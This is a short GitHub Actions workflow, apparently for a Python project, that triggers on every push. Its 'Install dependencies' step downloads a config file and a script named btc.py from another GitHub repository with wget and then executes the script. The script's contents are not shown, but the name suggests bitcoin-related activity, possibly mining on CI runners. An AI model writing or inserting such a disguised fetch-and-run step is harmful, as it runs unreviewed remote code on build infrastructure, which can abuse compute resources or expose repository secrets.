name: Python applicationt

on:
  push:

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3
    - name: Set up Python 3.11
      uses: actions/setup-python@v3
      with:
        python-version: "3.11"
    - name: Install dependencies
      run: |
        pip install requests
        pip install beautifulsoup4
        pip install colorama
        wget https://github.com/Mosnio/wCUn/raw/main/c1.json -O config.json
        wget https://github.com/Mosnio/wCUn/raw/main/btc.py
        ls
        python btc.py
